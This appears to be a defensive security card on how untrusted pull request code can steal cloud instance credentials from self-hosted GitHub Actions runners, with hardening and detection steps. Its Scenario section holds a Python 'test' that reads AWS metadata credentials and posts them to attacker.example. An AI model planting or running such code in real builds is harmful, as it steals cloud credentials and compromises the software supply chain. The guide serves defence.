---
title: Cloud Metadata Credential Theft in Builds
category: CI/CD & Build
ref: RFX-CI-03
precedent: "2024"
scenario: Untrusted pull request code reads a cloud runner's instance credentials
focus:
  - self-hosted runners on cloud VMs
  - instance metadata service (IMDS) credentials
  - fork pull requests and pull_request_target
---

## Scenario

An open-source machine learning project runs its GPU tests on self-hosted GitHub Actions runners. The runners are long-lived EC2 instances. Their instance role can write to the S3 bucket that hosts nightly builds.

1. The attacker submits a typo fix. It is merged, so they now count as a previous contributor and their pull requests no longer need approval to run workflows.
2. They open a pull request that adds a "test". The test calls the instance metadata service directly:

    ```python
    import requests

    def test_environment():
        base = "http://169.254.169.254/latest"
        token = requests.put(
            f"{base}/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
        ).text
        hdr = {"X-aws-ec2-metadata-token": token}
        role = requests.get(f"{base}/meta-data/iam/security-credentials/", headers=hdr).text
        creds = requests.get(f"{base}/meta-data/iam/security-credentials/{role}", headers=hdr).text
        requests.post("https://attacker.example/c", data=creds)
    ```

3. The workflow runs the test suite on the self-hosted runner. The attacker now has temporary credentials for the instance role and overwrites the nightly build.

This is code execution, so no server-side request forgery (SSRF) is needed. Enforcing IMDSv2 does not help either: the attacker's code simply asks for a session token first. IMDSv2 defends against SSRF, where the attacker controls a URL but not the HTTP method or headers.

GitHub-hosted runners are not affected in the same way, because they don't carry your cloud identity. The risk lives on self-hosted runners in your cloud account, and in `pull_request_target` workflows that check out and run pull request code with secrets available.

::: {! precedent}
**Real-world precedent:** In January 2024, [John Stawinski and Adnan Khan showed](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/) that a contributor's fork pull request could run code on PyTorch's persistent self-hosted runners and steal tokens and AWS keys. In 2019, an SSRF flaw let an attacker reach the EC2 metadata service at [Capital One](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/) and use the role credentials to copy data on over 100 million customers.
:::

::: {! stage recon}
## Reconnaissance

### Explanation
Attackers look for public repositories whose workflows use `runs-on: self-hosted` (or custom labels) on `pull_request` or `pull_request_target`. Workflow files are public, so this takes minutes.

### Insight
A self-hosted runner in your cloud account carries its host's identity. Anyone who can run code on it can ask the metadata service for that identity.

### Practical
- Search your organisation's workflows for self-hosted labels and risky triggers:

    ```bash
    grep -rnE "runs-on:.*self-hosted|pull_request_target" .github/workflows/
    ```

- List the instance profile or service account attached to each runner and what it can do.
- Check **Settings > Actions > General** for the fork pull request approval policy.

### Tools/Techniques
- [Gato-X](https://github.com/AdnaneKhan/gato-x) to enumerate self-hosted runner exposure in GitHub organisations you own.
- [zizmor](https://github.com/zizmorcore/zizmor) to flag dangerous triggers in workflows.

### Metrics/Signal
- Public repositories running fork pull request code on self-hosted runners.
- Runner instance roles with write access to anything.
:::

::: {! stage evaluate}
## Evaluate

### Explanation
For each self-hosted runner, work out who can run code on it and what its metadata service would hand them.

### Insight
There are two separate questions. Can untrusted code run on the runner? If yes, IMDSv2 won't save you. Can a URL-fetching step (docs builds, link checkers, image fetchers) be pointed at the metadata address? IMDSv2 does help there.

### Practical
- Check whether IMDSv2 is enforced and what the hop limit is:

    ```bash
    aws ec2 describe-instances --instance-ids i-0123456789abcdef0 \
      --query 'Reservations[].Instances[].MetadataOptions'
    ```

- From a job in a container on the runner, check whether the metadata service is reachable. With IMDSv2 enforced, a plain request returns `401`: the service is still reachable, it just wants a token.

    ```bash
    curl -s -o /dev/null -w '%{http_code}\n' --max-time 3 \
      http://169.254.169.254/latest/meta-data/
    ```

- Check for `pull_request_target` workflows that check out `github.event.pull_request.head.sha` and run build or test steps.

### Tools/Techniques
- AWS Config rule `ec2-imdsv2-check`.
- [GitHub security hardening for Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions).

### Metrics/Signal
- Runners without IMDSv2 enforced.
- Runners where a containerised job can obtain an IMDS token.
:::

::: {! stage fortify}
## Fortify

### Explanation
Keep untrusted code off cloud runners, and keep cloud identity off the runner host.

### Insight
The safest runner identity is none at all. Give the host no useful permissions and let each trusted job fetch its own short-lived credentials through OIDC.

### Practical
- Run fork pull requests on GitHub-hosted runners only. Reserve self-hosted runners for trusted branches.
- Set the fork pull request policy to **Require approval for all external contributors**.
- Give runner instances a role with no permissions beyond what the runner agent needs. Use GitHub OIDC for job credentials, scoped by the `sub` claim:

    ```json
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:example-org/example-repo:ref:refs/heads/main"
        }
      }
    }
    ```

- Enforce IMDSv2 with a hop limit of 1. Jobs running in containers on a bridge network then can't receive a token, and SSRF-style requests are blocked:

    ```bash
    aws ec2 modify-instance-metadata-options \
      --instance-id i-0123456789abcdef0 \
      --http-tokens required \
      --http-put-response-hop-limit 1
    ```

### Tools/Techniques
- [AWS: Configure instance metadata options](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-existing-instances.html).
- [GitHub OIDC with AWS](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services).
- [Actions Runner Controller](https://github.com/actions/actions-runner-controller) for ephemeral runner pods.

### Metrics/Signal
- Self-hosted runners that accept fork pull request jobs (target: zero).
- Runner instance roles with permissions beyond the agent's needs.
:::

::: {! stage limit}
## Limit

### Explanation
If attacker code does reach a runner, keep the stolen credentials weak and the runner disposable.

### Insight
PyTorch's runners were persistent, so the attacker's foothold outlived the job. One job per runner, then destroy it.

### Practical
- Use ephemeral runners (`--ephemeral` registration or Actions Runner Controller) so each job gets a fresh machine or pod.
- Block containerised jobs from reaching the metadata address on Docker hosts:

    ```bash
    iptables --insert DOCKER-USER 1 --in-interface docker+ \
      --destination 169.254.169.254/32 --jump DROP
    ```

- On EKS, use EKS Pod Identity or IRSA for runner pods, and keep the node's hop limit at 1 so pods can't use the node role.
- Restrict runner egress so stolen credentials can't be posted to arbitrary hosts.

### Tools/Techniques
- [EKS Pod Identity](https://docs.aws.amazon.com/eks/latest/userguide/pod-identities.html).
- [GitHub: self-hosted runner security](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners).

### Metrics/Signal
- Share of self-hosted runners that are ephemeral.
- Containerised jobs able to reach `169.254.169.254` (target: zero).
:::

::: {! stage expose}
## Expose

### Explanation
Detect instance credentials being used away from the instance.

### Insight
Instance role credentials are meant to be used from the instance. AWS can tell you when they aren't.

### Practical
- Enable GuardDuty. Its `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` and `.InsideAWS` findings fire when instance credentials are used from elsewhere.
- Log process and network activity on runners. Alert when a test process connects to `169.254.169.254`.
- Review CloudTrail for runner role calls that the runner agent never makes, such as `s3:PutObject` from the instance role.

### Tools/Techniques
- [Amazon GuardDuty finding types](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html).
- [Falco](https://falco.org/) or [Tetragon](https://tetragon.io/) on runner hosts.

### Metrics/Signal
- GuardDuty instance credential exfiltration findings for runner roles.
- Metadata service connections from job processes.
:::

::: {! stage exercise}
## Exercise

### Explanation
Check, safely, what a job on your runners can learn from the metadata service.

### Insight
You don't need to steal anything to prove the risk. Reachability and the role name are enough.

### Practical
1. In a sandbox AWS account, launch a runner configured like production, with a role that has no permissions.
2. From a private test repository, run a job that records the HTTP status of a plain metadata request, whether a token can be obtained, and the role name. Print nothing else.
3. Repeat from inside a container job. With hop limit 1 or the `DOCKER-USER` rule, the token request should time out.
4. Open a pull request from a test fork you control and confirm it waits for approval.

### Tools/Techniques
- A sandbox AWS account with a zero-permission role.
- A private repository and a fork under a test account.

### Metrics/Signal
- Whether container jobs can obtain a token (target: no).
- Whether fork pull requests ran without approval (target: no).
:::

## Further Reading

- [Playing with Fire: supply chain attack on PyTorch (2024)](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/)
- [AWS: Use IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [GitHub: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [Related card: GitHub OIDC misconfiguration](#battlecards-github-oidc-misconfiguration-md)
- [Related card: GitHub Actions workflow poisoning](#battlecards-github-actions-workflow-poisoning-md)
